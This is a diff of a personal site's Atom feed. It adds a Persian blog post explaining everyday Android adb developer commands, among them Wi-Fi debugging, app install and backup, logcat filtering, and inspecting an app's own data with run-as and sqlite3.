@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="https://mjafar.me/feed.xml" rel="self" type="application/atom+xml" /><link href="https://mjafar.me/" rel="alternate" type="text/html" /><updated>2020-10-04T01:14:38+00:00</updated><id>https://mjafar.me/feed.xml</id><title type="html">Mohammad Jafar Mashhadi</title><subtitle>My portfolio website I guess?</subtitle><entry><title type="html">MSc thesis: Black-box Behavioral Model Inference for Autopilot Software Systems</title><link href="https://mjafar.me/publications/UCalgary-graduate-thesis.html" rel="alternate" type="text/html" title="MSc thesis: Black-box Behavioral Model Inference for Autopilot Software Systems" /><published>2020-09-10T15:00:00+00:00</published><updated>2020-09-10T15:00:00+00:00</updated><id>https://mjafar.me/publications/UCalgary-graduate-thesis</id><content type="html" xml:base="https://mjafar.me/publications/UCalgary-graduate-thesis.html">&lt;h2 id=&quot;abstract&quot;&gt;Abstract&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="https://mjafar.me/feed.xml" rel="self" type="application/atom+xml" /><link href="https://mjafar.me/" rel="alternate" type="text/html" /><updated>2020-10-04T01:44:35+00:00</updated><id>https://mjafar.me/feed.xml</id><title type="html">Mohammad Jafar Mashhadi</title><subtitle>My portfolio website I guess?</subtitle><entry><title type="html">MSc thesis: Black-box Behavioral Model Inference for Autopilot Software Systems</title><link href="https://mjafar.me/publications/UCalgary-graduate-thesis.html" rel="alternate" type="text/html" title="MSc thesis: Black-box Behavioral Model Inference for Autopilot Software Systems" /><published>2020-09-10T15:00:00+00:00</published><updated>2020-09-10T15:00:00+00:00</updated><id>https://mjafar.me/publications/UCalgary-graduate-thesis</id><content type="html" xml:base="https://mjafar.me/publications/UCalgary-graduate-thesis.html">&lt;h2 id=&quot;abstract&quot;&gt;Abstract&lt;/h2&gt;
 &lt;p&gt;Inferring behavior model of a running software system is quite useful for several automated software engineering tasks, such as program comprehension, anomaly detection, and testing. Most existing dynamic model inference techniques are white-box, i.e. they require source code to be instrumented to get run-time traces. However, in many systems, instrumenting the entire source code is not possible (e.g., when using black-box third-party libraries) or might be very costly. 
 Unfortunately, most black-box techniques that detect states over time are either univariate, or make assumptions on the data distribution, or have limited power for learning over a long period of past behavior. 
 To overcome the above issues, in this thesis, I proposed a hybrid deep neural network that accepts as input a set of time series, one per input/output signal of the system, and applies a set of convolutional and recurrent layers to learn the non-linear correlations between signals and the patterns, over time. 
@@ -84,7 +84,260 @@ techniques on a real-world debugging context.&lt;/p&gt;
 
 &lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;
 &lt;p&gt;The main conclusion of this study is that the idea of an “interactive” specification mining rather than a fully 
-automated mining tool is NOT impractical and indeed is useful for the debugging use case.&lt;/p&gt;</content><author><name></name></author><category term="publication" /><category term="publication" /><category term="software engineering" /><summary type="html">Also presented at ASE 2019’s journal-first presentations track.</summary></entry><entry><title type="html">چگونه از git استفاده کنیم–بخش دوم–branch, merge و rebase</title><link href="https://mjafar.me/blog/2015/09/how-to-use-git-part2/" rel="alternate" type="text/html" title="چگونه از git استفاده کنیم&amp;ndash;بخش دوم&amp;ndash;branch, merge و rebase" /><published>2015-09-27T00:15:49+00:00</published><updated>2015-09-27T00:15:49+00:00</updated><id>https://mjafar.me/blog/2015/09/how-to-use-git-part2</id><content type="html" xml:base="https://mjafar.me/blog/2015/09/how-to-use-git-part2/">&lt;p&gt;این مطلب در ادامه‌ی &lt;a href=&quot;/blog/2015/08/how-to-use-git/&quot; target=&quot;_blank&quot;&gt;چگونه از git استفاده کنیم&lt;/a&gt; نوشته شده. پیشنهاد می‌کنم قبل از مطالعه‌ی این مطلب به پست قبلی هم یک نگاه بندازید. در ادامه‌ی مطلب بر خلاف مطلب قبلی برای راحت تر شدن فهم موضوع فرض شده که از گیت برای مدیریت کد منبع یک نرم‌افزار استفاده می‌شه، هرچند بدیهتاً کاربرد گیت محدود به این موضوع نیست.&lt;/p&gt;
+automated mining tool is NOT impractical and indeed is useful for the debugging use case.&lt;/p&gt;</content><author><name></name></author><category term="publication" /><category term="publication" /><category term="software engineering" /><summary type="html">Also presented at ASE 2019’s journal-first presentations track.</summary></entry><entry><title type="html">زیر و بم ADB اندروید</title><link href="https://mjafar.me/blog/2015/11/mastering-android-adb/" rel="alternate" type="text/html" title="زیر و بم ADB اندروید" /><published>2015-11-13T12:59:32+00:00</published><updated>2015-11-13T12:59:32+00:00</updated><id>https://mjafar.me/blog/2015/11/mastering-android-adb</id><content type="html" xml:base="https://mjafar.me/blog/2015/11/mastering-android-adb/">&lt;p&gt;در مجموعه ابزارهای توسعه‌ی اندروید (Android SDK) یکی از پرکاربردترین و مهم‌ترین ابزارها، ابزار خط‌فرمانی‌ای به نام adb (سرواژه‌های Android Debug Bridge) هست. adb وسیله‌ی اصلی ارتباط بین رایانه و دستگاه اندرویدی (یا امولاتور) هست  که خود IDEها (مثل اندروید استودیو، IntelliJ IDEA و سابقاً eclipse) به کمک این ابزار ارتباطشون با دستگاه برای کارهایی مثل نصب اپ، وصل کردن debugger و نمایش logcat انجام می‌دن. در ادامه با تعدادی از کاربردهای مفید این ابزار رو آشنا می‌شید که می‌تونه خیلی از کارهاتون رو راحت کنه.&lt;/p&gt;
+&lt;h3 id=&quot;اضافه-کردن-adb-به-path&quot;&gt;اضافه کردن adb به PATH&lt;/h3&gt;
+&lt;p&gt;برای اینکه بتونید مستقیماً دستورات رو در ترمینال/خط‌فرمان وارد کنید بهتره که پوشه‌ی حاوی ‎‎&lt;span style=&quot;direction: ltr;&quot;&gt;‎adb ‎‎(platform-tools)‎&lt;/span&gt; رو به PATH سیستم اضافه کنید. تو لینوکس خط زیر رو باید به آخر فایل ‎.‎bashrc‎ اضافه کنید. تو ویندوز هم باید مثل این عکس System Properties رو باز کنید، دکمه‌ی Environment Variables رو کلیک کنید و در بخش System variables متغیر PATH رو ویرایش کنید. اگر وجود نداشت باید بسازید.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;:/path/to/android-sdk/platform-tools/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img style=&quot;background-image: none; float: none; padding-top: 0px; padding-left: 0px; margin-left: auto; display: block; padding-right: 0px; margin-right: auto; border-width: 0px;&quot; title=&quot;image&quot; src=&quot;/assets/images/2015/11/windows_add_path.png&quot; alt=&quot;image&quot; width=&quot;803&quot; height=&quot;471&quot; border=&quot;0&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;بخش-اول-شروع-کار-با-adb&quot;&gt;بخش اول: شروع کار با adb&lt;/h3&gt;
+&lt;p&gt;در ترمینال یا Power Shell اسم adb رو بنویسید و enter بزنید. باید نسخه و لیستی ازکامندهای adb رو ببینید؛ اگر اینطور نیست تنظیمات PATH یا نصب Android SDK ممکنه مشکل داشته باشه.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;adb devices
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;لیست دستگاه‌هایی (و امولاتورهای فعال) که USB Debuggingشون روشنه و با کابل به کامپیوترتون وصل شدند رو نشون می‌ده.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;background-image: none; float: none; padding-top: 0px; padding-left: 0px; margin-left: auto; display: block; padding-right: 0px; margin-right: auto; border-width: 0px;&quot; title=&quot;image&quot; src=&quot;/assets/images/2015/11/adb_devices_usb.png&quot; alt=&quot;image&quot; width=&quot;397&quot; height=&quot;143&quot; border=&quot;0&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;بعضی اوقات در لینوکس ممکنه سریال دستگاه به صورت ؟؟؟؟؟؟؟ نشون داده بشه، در این مواقع باید adb رو restart کنید و با sudo اجرا کنید. این کار رو با دوتا دستور زیر میشه انجام داد:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;adb kill-server
+&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;adb start-server
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;بخش-دوم-اتصال-به-دستگاه-از-طریق-wi-fi-&quot;&gt;بخش دوم: اتصال به دستگاه از طریق Wi-Fi &lt;a href=&quot;http://developer.android.com/tools/help/adb.html#wireless&quot; target=&quot;_blank&quot;&gt;+&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;adb بدون کابل USB هم می‌تونه به دستگاه وصل شه. برای دولوپر‌ها و QAهایی که تعداد زیادی دستگاه برای تست دارند ولی به اون اندازه پورت خالی USB ندارن میتونه خیلی کاربردی باشه. با دستور tcpip باید دستگاه رو وارد حالت wifi کرد. بعد از اجرای موفق این دستور می‌تونید کابل رو از دستگاه جدا کنید و با adb connect به دستگاه وصل شید. برای فهمیدن آدرس IP دستگاه می‌تونید وارد بخش Settings &amp;gt; About Phone &amp;gt; Network بشید یا قبل از جدا کردن کابل usb از دستور adb shell ntcfg استفاده کنید.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;adb tcpip 5555
+adb shell netcfg
+&lt;span class=&quot;c&quot;&gt;# Disconnect phone from USB cable&lt;/span&gt;
+adb connect &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ip]:5555 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img style=&quot;background-image: none; float: none; padding-top: 0px; padding-left: 0px; margin-left: auto; display: block; padding-right: 0px; margin-right: auto; border-width: 0px;&quot; title=&quot;image&quot; src=&quot;/assets/images/2015/11/adb_device_wifi.png&quot; alt=&quot;image&quot; width=&quot;335&quot; height=&quot;142&quot; border=&quot;0&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;برای دستگاه‌هایی که با Wi-Fi وصل شدند تو خروجی adb devices بجای سریال نامبر گوشی آدرس IP و پورت ۵۵۵۵ دیده می‌شه.&lt;/p&gt;
+&lt;h3 id=&quot;بخش-سوم&quot;&gt;بخش سوم&lt;/h3&gt;
+&lt;h4 id=&quot;انتقال-فایل&quot;&gt;انتقال فایل&lt;/h4&gt;
+&lt;p&gt;با دستورهای push و pull می‌تونید بین دستگاه اندرویدی و رایانه‌تون فایل انتقال بدید.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;adb push &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Local Path] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Device Path] &lt;span class=&quot;c&quot;&gt;# Copy file to device&lt;/span&gt;
+adb pull &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Device Path] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Local Path] &lt;span class=&quot;c&quot;&gt;# Copy file from device&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;نصب-و-مدیریت-اپلیکیشنها&quot;&gt;نصب و مدیریت اپلیکیشن‌ها&lt;/h4&gt;
+&lt;p&gt;نصب یک اپلیکیشن از روی فایل apk:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;adb install my-application.apk
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;نصب همزمان چند اپلیکیشن&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;adb install-multiple app1.apk app2.apk ...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;نصب روی SDCard:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;adb install &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; my-application.apk
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;نصب یک نسخه‌ی به‌روز تر از برنامه‌ای که روی دستگاه نصب شده:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;adb install &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; my-application.apk
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;نصب نسخه‌ی قدیمی‌تر نسبت به نسخه‌ای که روی دستگاه نصب شده:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;adb install &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; my-application.apk 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;حذف برنامه با اسم پکیج وارد شده:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;adb uninstall &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Package Name]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;حذف، بدون پاک شدن دیتا:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;adb uninstall &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Package Name]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;فهرست برنامه‌های نصب شده روی گوشی:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;adb shell pm list packages
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;حذف تمام اطلاعات برنامه، معادل دکمه‌ی Clear Data در Settings:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;adb shell pm clear &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Package Name]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;توقف و از بین بردن تمام مؤلفه‌های (اکتیویتی، سرویس، …) یک اپلیکیشن در حال اجرا از حافظه. معادل دکمه‌ی Force Stop در Settings:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;adb shell am force-stop &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Package Name]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;چند-دستور-متفرقه&quot;&gt;چند دستور متفرقه&lt;/h4&gt;
+&lt;p&gt;ریبوت دستگاه به صورت عادی یا حالت safe:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;adb reboot
+adb reboot recovery
+adb reboot bootloader
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;با دستور زیر به خروجی logcat دسترسی پیدا می‌کنید. برای مثال به عنوان کاربرد مفیدش می‌تونید این خروجی رو در فایل ذخیره کنید یا به grep ارسال کنید.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;adb logcat
+adb logcat &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; logs.txt
+adb logcat &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 20
+adb logcat &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;:e
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;خط اول فراخوانی و نمایش log دستگاه به صورت عادی است.
+خط دوم محتویات log را در فایلی به اسم logs.txt ذخیره می‌کند.
+خط سوم فقط 20 مورد آخر logها را نمایش می‌دهد.
+خط چهارم فقط مواردی را نشان می‌دهد که در سطح Error یا وخیم تر باشند. levelهای دیگر قابل استفاده:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;level&lt;/th&gt;
+      &lt;th&gt;meaning&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;v&lt;/td&gt;
+      &lt;td&gt;verbose - همه‌چیز&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;d&lt;/td&gt;
+      &lt;td&gt;debug&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;i&lt;/td&gt;
+      &lt;td&gt;info&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;w&lt;/td&gt;
+      &lt;td&gt;warning&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;e&lt;/td&gt;
+      &lt;td&gt;error&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;f&lt;/td&gt;
+      &lt;td&gt;fatal&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;s&lt;/td&gt;
+      &lt;td&gt;silent - هیچ‌چیز&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;با این دستور &lt;em&gt;در اندروید ۴ به بالا&lt;/em&gt; می‌تونید از یک یا چند اپلیکیشن فایل backup تهیه کنید و بعدا restore کنید. این فایل backup شامل دیتای اپلیکیشن مورد نظر هست. اگر مثل خط دوم و سوم از آپشن ‎&lt;code class=&quot;highlighter-rouge&quot;&gt;-apk&lt;/code&gt; استفاده کنید فایل‌های apk برنامه‌ها هم در فایل بکاپ وجود خواهند داشت. با استفاده از کدی که &lt;a href=&quot;https://gist.github.com/MJafarMashhadi/f6ecb978ddc031c17cbccdc3faafd4be&quot; target=&quot;_blank&quot;&gt;روی گیتهاب&lt;/a&gt; به اشتراک گذاشتم می‌تونید فایل بکاپ اندروید رو تبدیل به یک فایل tar کنید که به راحتی فایل‌های داخلش قابل مشاهده و extract کردن هست.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;adb backup &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; backup-file.ab com.example.app1 com.example.app2
+adb backup &lt;span class=&quot;nt&quot;&gt;-apk&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; backup-file.ab com.example.app1 com.example.app2
+abd backup &lt;span class=&quot;nt&quot;&gt;-all&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-apk&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; backup-file.ab &lt;span class=&quot;c&quot;&gt;# پشتیبان گیری از تمام اپلیکیشن‌ها همراه با فایل نصب&lt;/span&gt;
+adb restore backup-file.ab
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;بخش-چهارم-shell&quot;&gt;بخش چهارم: Shell&lt;/h3&gt;
+&lt;p&gt;دستور ‎&lt;tt style=&quot;direction: ltr;&quot;&gt;adb shell ‎[‎command]‎&lt;code class=&quot;highlighter-rouge&quot;&gt; برای اجرای یک دستور شل روی دستگاه کاربرد دارد؛ بالاتر برای clear data و force stop کردن برنامه‌ها دو نمونه استفاده از این دستور را دیدید. اگر دستور &lt;/code&gt;adb shell` را بدون وارد کردن دستور خاصی وارد کنید، وارد یک shell روی دستگاه می‌شود، درست مثل اینکه به دستگاه با ssh وصل شده باشید.&lt;/tt&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;mjafar@mjafar-VAIO]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;adb shell
+shell@g2:/ &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;از این شل می‌تونید دستورات مختلفی مثل &lt;a href=&quot;http://developer.android.com/tools/help/shell.html#pm&quot; target=&quot;_blank&quot;&gt;pm (Package Manager)‎&lt;/a&gt; برای مدیریت اپلیکیشن‌ها، &lt;a href=&quot;http://developer.android.com/tools/help/shell.html#am&quot; target=&quot;_blank&quot;&gt;am (Activity Manager)‎&lt;/a&gt; برای باز و بسته کردن و از بین بردن … اکتیویتی‌های برنامه‌ها، bmgr (Backup Manager)‎ برای تنظیمات پشتیبان گیری و بازگردانی گوشی، netcfg برای تنظیمات شبکه دستگاه رو خیلی راحت اجرا کنید. ابزار &lt;a href=&quot;http://developer.android.com/tools/help/monkey.html&quot;&gt;monkey&lt;/a&gt; که برای تست اپلیکیشن‌ها کاربرد داره هم تو این شل قابل استفاده‌ست.&lt;/p&gt;
+
+&lt;p&gt;شل از نوع sh و خیلی مینیمال هست اما به اندازه‌ی خیلی خوبی کار راه انداز. یکی از مهم ترین دستوراتی که تو این شل می‌تونید ازش استفاده کنید &lt;code class=&quot;highlighter-rouge&quot;&gt;run-as&lt;/code&gt; هست. این دستور user فعلی رو به user مربوط به اپلیکیشنی که وارد کردید تغییر میده و وارد پوشه‌ی dataی اون اپ میشه. بعد از این می‌تونید دیتای اپلیکیشن رو بخونید یا دست کاری کنید به طوری که انگار خود اپلیکیشن این تغییرات رو انجام داده.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;shell@g2:/ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;run-as com.example.myapp
+com.example.myapp@g2:/data/data/com.example.myapp &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;مثلا می‌شه مقادیر ذخیره شده در shared preferences اپلیکیشن رو که به صورت xml ذخیره شدند بخونید. دستور sqlite3 برای خواندن و تغییر محتویات دیتابیس اپلیکیشن قابل استفاده است.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;com.example.myapp@g2:/data/data/com.example.myapp &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls &lt;/span&gt;shared_prefs
+com.example.myapp@g2:/data/data/com.example.myapp &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sqlite3 databases/main.sqlite
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;امیدوارم این پست براتون مفید بوده باشه :-)&lt;/p&gt;</content><author><name>mashhadimj</name></author><category term="adb" /><category term="Android" /><category term="database" /><category term="forcestop" /><category term="install" /><category term="root" /><category term="shell" /><category term="sqlite" /><summary type="html">در مجموعه ابزارهای توسعه‌ی اندروید (Android SDK) یکی از پرکاربردترین و مهم‌ترین ابزارها، ابزار خط‌فرمانی‌ای به نام adb (سرواژه‌های Android Debug Bridge) هست. adb وسیله‌ی اصلی ارتباط بین رایانه و دستگاه اندرویدی (یا امولاتور) هست  که خود IDEها (مثل اندروید استودیو، IntelliJ IDEA و سابقاً eclipse) به کمک این ابزار ارتباطشون با دستگاه برای کارهایی مثل نصب اپ، وصل کردن debugger و نمایش logcat انجام می‌دن. در ادامه با تعدادی از کاربردهای مفید این ابزار رو آشنا می‌شید که می‌تونه خیلی از کارهاتون رو راحت کنه. اضافه کردن adb به PATH برای اینکه بتونید مستقیماً دستورات رو در ترمینال/خط‌فرمان وارد کنید بهتره که پوشه‌ی حاوی ‎‎‎adb ‎‎(platform-tools)‎ رو به PATH سیستم اضافه کنید. تو لینوکس خط زیر رو باید به آخر فایل ‎.‎bashrc‎ اضافه کنید. تو ویندوز هم باید مثل این عکس System Properties رو باز کنید، دکمه‌ی Environment Variables رو کلیک کنید و در بخش System variables متغیر PATH رو ویرایش کنید. اگر وجود نداشت باید بسازید.</summary></entry><entry><title type="html">رهایی از محدودیت ۶۵هزار متد در اندروید</title><link href="https://mjafar.me/blog/2015/09/handle-65k-methods-in-android/" rel="alternate" type="text/html" title="رهایی از محدودیت ۶۵هزار متد در اندروید" /><published>2015-09-28T00:08:12+00:00</published><updated>2015-09-28T00:08:12+00:00</updated><id>https://mjafar.me/blog/2015/09/handle-65k-methods-in-android</id><content type="html" xml:base="https://mjafar.me/blog/2015/09/handle-65k-methods-in-android/">&lt;p&gt;ماهیت شی گرایی زبان جاوا و فراهم کردن ساده‌ی امکان code reuse در کنار محبوبیت و قدمت این زبان باعث شده که کتابخانه‌ها و نمونه کدهای خیلی زیادی برای تسریع روند توسعه با جاوا به وجود بیان. محبوبیت اندروید در بین توسعه دهنده‌ها هم باعث شده که کتابخانه‌های این پلتفرم انقدر زیاد و متنوع بشن که تقریبا برای هر کاری یک کتابخانه‌ی آماده وجود داشته باشه. با مهاجرت گوگل هم به سیستم gradle استفاده از کتابخانه‌ها به سادگی آب خوردن شده. فقط یک خط اسم کتابخونه و ورژنش رو توی dependency فایل گریدل اضافه می‌کنیم! این نیمه‌ی پر لیوان بود، معمولا هیچ منفعتی به صورت خالص به دست نمیاد و همیشه به اصطلاح trade-off ای هست.&lt;/p&gt;
+
+&lt;p&gt;بعد از کامپایل هر فایل java یک یا چند فایل ‎.class (بسته به تعداد کلاس‌های داخل اون فایل) تولید می‌شه؛ اگر تا به حال کنکجاو شده باشید و یک فایل apk رو با نرم افزارهای فشرده ساز باز کرده باشید احتمالا متوجه وجود فایلی به اسم classes.dex شدید؛ این فایل ترکیب تمام فایل‌های ‎.class ای هست که بعد از کامپایل کد برنامه‌مون تولید می‌شن. کدهای مربوط به کتابخانه‌های استفاده شده هم همراه کدهای خودمون همه داخل این فایل هستند. اندروید، یا بهتر بگم Dalvik، در حین نصب و اجرای یک اپ به تمام متدهای تمام کلاس‌های کد یک شماره اختصاص می‌ده و اطلاعاتی رو درباره‌ی متدها در یک حافظه‌ی میانگیر (buffer) به اسم &lt;a href=&quot;https://github.com/android/platform_dalvik/blob/android-2.3.7_r1/vm/LinearAlloc.h#L33&quot; target=&quot;_blank&quot;&gt;LinearAlloc&lt;/a&gt; نگهداری می‌کنه. متأسفانه اندازه‌ی این بافر محدود به ۶۵۵۳۶ (۲&lt;sup&gt;۱۶&lt;/sup&gt;) هست و اگر اپ از کتابخانه‌های زیادی استفاده کرده باشه یا خیلی ماژولار نوشته شده باشه و تعداد متدها زیاد باشه خیلی راحت ممکنه این محدودیت رو رد کنیم و برنامه کامپایل نشه. یا حتا بدتر از اون کامپایل بشه ولی به محض اجرا اکسپشن بخوره. اکسپشن Class Not Found، در صورتی که می‌بینید توی کد قبل کامپایل کلاسی که می‌گه نیست واقعا وجود داره! در ادامه‌ی مطلب راه حل‌های رفع این مشکل رو بررسی می‌کنیم.&lt;/p&gt;
